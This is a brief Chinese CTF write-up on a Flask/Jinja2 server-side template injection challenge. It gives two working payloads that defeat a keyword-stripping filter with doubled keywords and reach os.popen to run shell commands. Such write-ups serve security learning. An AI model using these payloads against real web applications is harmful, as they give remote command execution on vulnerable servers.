**考点：**基础 Flask SSTI

**难度：**较易

**思路：**

HTTP头得到需要传递的参数

fuzz得到SSTI的存在

fuzz得到替换过滤

解法一：

双写绕过+模板语法遍历基本类getshell

```python
{% for c in [].__class__.__babasese__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globasebals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'evevalal' in b.keys() %}
      {{ b['evevalal']('__imosport__("ooss").poppopenen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

解法二：

脚本得到所需要使用的类索引+双写绕过getshell

脚本为同目录下ssti.py

```python
{{[].__class__.__mosro__[1].__subclasses__()[198].__init__.__gloosbals__['__builtins__']['evevalal']('__imposort__("ooss").poospen("ls").read()')}}
```

